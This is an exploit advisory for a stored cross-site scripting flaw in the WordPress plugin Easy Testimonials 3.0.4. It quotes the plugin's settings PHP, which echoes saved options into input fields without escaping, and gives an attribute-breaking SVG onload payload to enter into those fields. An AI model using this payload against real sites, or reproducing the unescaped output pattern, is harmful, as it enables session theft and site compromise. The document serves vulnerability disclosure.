
#### Exploit Title: WordPress Plugin Easy Testimonials Stored XSS 
#### Exploit Author: ning1022
####Plugin URI: https://goldplugins.com/our-plugins/easy-testimonials-details/
#### Version: 3.0.4


Vulnerability code

```
/easy-testimonials/include/settings/display.options.php


	function output_width_options(){
		?>
		<h3>Default Testimonials Width</h3>
		<table class="form-table">
			<tr valign="top">
				<th scope="row"><label for="easy_t_width">Default Testimonials Width</label></th>
				<td><input type="text" name="easy_t_width" id="easy_t_width" value="<?php echo get_option('easy_t_width', ''); ?>" />
				<p class="description">If you want, you can set a global width for Testimonials.  This can be left blank and it can also be overrode directly, via the shortcode.</p>
				</td>
			</tr>
		</table>
		<?php
	}
	
	
		function output_excerpt_options(){
		?>
		<h3>Testimonial Excerpt Options</h3>
		<table class="form-table">
			<tr valign="top">
				<th scope="row"><label for="easy_t_excerpt_length">Excerpt Length</label></th>
				<td><input type="text" name="easy_t_excerpt_length" id="easy_t_excerpt_length" value="<?php echo get_option('easy_t_excerpt_length', 55); ?>" />
				<p class="description">This is the number of words to use in an shortened testimonial.  The default value is 55 words.</p>
				</td>
			</tr>
			<tr valign="top">
				<th scope="row"><label for="easy_t_excerpt_text">Excerpt Text</label></th>
				<td><input type="text" name="easy_t_excerpt_text" id="easy_t_excerpt_text" value="<?php echo get_option('easy_t_excerpt_text', 'Continue Reading'); ?>" />
				<p class="description">The text used after the Excerpt.  If you are linking your Excerpts to Full Testimonials, this text is used in the Link.  This defaults to "Continue Reading".</p>
				</td>
			</tr>
			<tr valign="top">
				<td><input type="checkbox" name="easy_t_link_excerpt_to_full" id="easy_t_link_excerpt_to_full" value="1" <?php if(get_option('easy_t_link_excerpt_to_full', true)){ ?> checked="CHECKED" <?php } ?>/>
				<label for="easy_t_link_excerpt_to_full">Link Excerpts to Full Testimonial</label>
				<p class="description">If checked, shortened testimonials will end with a link that goes to the full length Testimonial.</p>
				</td>
			</tr>
		</table>
		<?php
	}
	
	
	
	
		function output_viewmoretestimonials_options(){
		?>
		<h3>View More Testimonials Link</h3>
		<table class="form-table">
			<tr valign="top">
				<th scope="row"><label for="testimonials_link">Link Address</label></th>
				<td><input type="text" name="testimonials_link" id="testimonials_link" value="<?php echo get_option('testimonials_link', ''); ?>" />
				<p class="description">This is the URL of the 'View More' Link.</p>
				</td>
			</tr>
			<tr valign="top">
				<th scope="row"><label for="easy_t_view_more_link_text">Link Text</label></th>
				<td><input type="text" name="easy_t_view_more_link_text" id="easy_t_view_more_link_text" value="<?php echo get_option('easy_t_view_more_link_text', 'Read More Testimonials'); ?>" />
				<p class="description">The Value of the View More Link text.  This defaults to Read More Testimonials, but can be changed.</p>
				</td>
			</tr>
			<tr valign="top">
				<td><input type="checkbox" name="easy_t_show_view_more_link" id="easy_t_show_view_more_link" value="1" <?php if(get_option('easy_t_show_view_more_link', false)){ ?> checked="CHECKED" <?php } ?>/>
				<label for="easy_t_show_view_more_link">Show View More Testimonials Link</label>
				<p class="description">If checked, the View More Testimonials Link will be displayed after each testimonial.  This is useful to direct visitors to a page that has many more Testimonials on it to read.</p>
				</td>
			</tr>
		</table>
		<?php
	}
	
	function output_shortcode_options(){
		?>
			<h3>Shortcode Options</h3>
			<p class="description">Use these fields to control our registered shortcodes. This can be helpful when Easy Testimonials and another plugin (or your theme) are using the same shortcodes.</p>
			<p class="description"><strong>Tip:</strong> Try changing these fields if our shortcodes are not displaying anything at all.</p>
			<table class="form-table">
				<tr valign="top">
					<th scope="row"><label for="ezt_random_testimonial_shortcode">Random Testimonial Shortcode</label></th>
					<td><input type="text" name="ezt_random_testimonial_shortcode" id="ezt_random_testimonial_shortcode" value="<?php echo get_option('ezt_random_testimonial_shortcode', 'random_testimonial'); ?>" />
					<p class="description">Displays one or more testimonials, chosen at random on each page load. Default: random_testimonial</p>
					</td>
				</tr>
			</table>
			<table class="form-table">
				<tr valign="top">
					<th scope="row"><label for="ezt_single_testimonial_shortcode">Single Testimonial Shortcode</label></th>
					<td><input type="text" name="ezt_single_testimonial_shortcode" id="ezt_single_testimonial_shortcode" value="<?php echo get_option('ezt_single_testimonial_shortcode', 'single_testimonial'); ?>" />
					<p class="description">Displays a single testimonial, chosen by you. Default: single_testimonial</p>
					</td>
				</tr>
			</table>
			<table class="form-table">
				<tr valign="top">
					<th scope="row"><label for="ezt_testimonials_shortcode">Testimonials List Shortcode</label></th>
					<td><input type="text" name="ezt_testimonials_shortcode" id="ezt_testimonials_shortcode" value="<?php echo get_option('ezt_testimonials_shortcode', 'testimonials'); ?>" />
					<p class="description">Displays a list of testimonials. Default: testimonials</p>
					</td>
				</tr>
			</table>
			<table class="form-table">
				<tr valign="top">
					<th scope="row"><label for="ezt_cycle_testimonial_shortcode">Testimonials Cycle Shortcode</label></th>
					<td><input type="text" name="ezt_cycle_testimonial_shortcode" id="ezt_cycle_testimonial_shortcode" value="<?php echo get_option('ezt_cycle_testimonial_shortcode', 'testimonials_cycle'); ?>" />
					<p class="description">Displays a rotating slideshow of testimonials. Default: testimonial_cycle</p>
					</td>
				</tr>
			</table>
			<table class="form-table">
				<tr valign="top">
					<th scope="row"><label for="ezt_submit_testimonial_shortcode">Testimonial Submission Form Shortcode</label></th>
					<td><input type="text" name="ezt_submit_testimonial_shortcode" id="ezt_submit_testimonial_shortcode" value="<?php echo get_option('ezt_submit_testimonial_shortcode', 'submit_testimonial'); ?>" />
					<p class="description">Displays the Submit Your Testimonial Form, which collects new Testimonials from your visitors. Default: submit_testimonial</p>
					</td>
				</tr>
			</table>
			<table class="form-table">
				<tr valign="top">
					<th scope="row"><label for="ezt_testimonials_count_shortcode">Testimonials Count Shortcode</label></th>
					<td><input type="text" name="ezt_testimonials_count_shortcode" id="ezt_testimonials_count_shortcode" value="<?php echo get_option('ezt_testimonials_count_shortcode', 'testimonials_count'); ?>" />
					<p class="description">Displays the numeric count of testimonials, based on the attributes you specify. Default: testimonials_count</p>
					</td>
				</tr>
			</table>
			<table class="form-table">
				<tr valign="top">
					<th scope="row"><label for="ezt_testimonials_grid_shortcode">Testimonials Grid Shortcode</label></th>
					<td><input type="text" name="ezt_testimonials_grid_shortcode" id="ezt_testimonials_grid_shortcode" value="<?php echo get_option('ezt_testimonials_grid_shortcode', 'testimonials_grid'); ?>" />
					<p class="description">Displays a responsive grid of testimonials, up to 10 columns wide. Default: testimonials_grid</p>
					</td>
				</tr>
			</table>
		<?php
	}
	
	
	
	
	
	
```

Proof of Concept (PoC):

```

ning1022"><svg onload=alert(/1022/)>


```

put poc on input textfields.

![http://ofjyzpv9h.bkt.clouddn.com/easy5.png](http://ofjyzpv9h.bkt.clouddn.com/easy5.png)


![http://ofjyzpv9h.bkt.clouddn.com/easy4.png](http://ofjyzpv9h.bkt.clouddn.com/easy4.png)

![http://ofjyzpv9h.bkt.clouddn.com/easy3.png](http://ofjyzpv9h.bkt.clouddn.com/easy3.png)

![http://ofjyzpv9h.bkt.clouddn.com/easy2.png](http://ofjyzpv9h.bkt.clouddn.com/easy2.png)

![http://ofjyzpv9h.bkt.clouddn.com/easy1.png](http://ofjyzpv9h.bkt.clouddn.com/easy1.png)








